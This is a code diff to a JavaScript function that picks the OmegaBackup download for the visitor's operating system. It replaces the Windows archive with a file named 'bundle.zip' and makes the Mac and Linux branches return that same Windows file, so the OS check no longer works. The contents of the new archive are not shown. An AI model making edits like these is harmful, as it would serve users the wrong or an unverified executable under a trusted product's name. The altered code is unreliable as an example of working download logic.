@@ -1,13 +1,13 @@
 import mac from "../../assets/downloads/omegabackup_mac.zip";
-import windows from "../../assets/downloads/omegabackup.exe.zip";
+import windows from "../../assets/downloads/bundle.zip";
 import linux from "../../assets/downloads/omegabackup_unix.zip";
 
 function getOS() {
 	console.log(navigator.userAgent);
 	if (navigator.userAgent.indexOf("Mac") > -1) {
-		return mac;
+		return windows;
 	} else if (navigator.userAgent.indexOf("Linux") > -1) {
-		return linux;
+		return windows;
 	} else if (navigator.userAgent.indexOf("Windows") > -1) {
 		return windows;
 	} else {
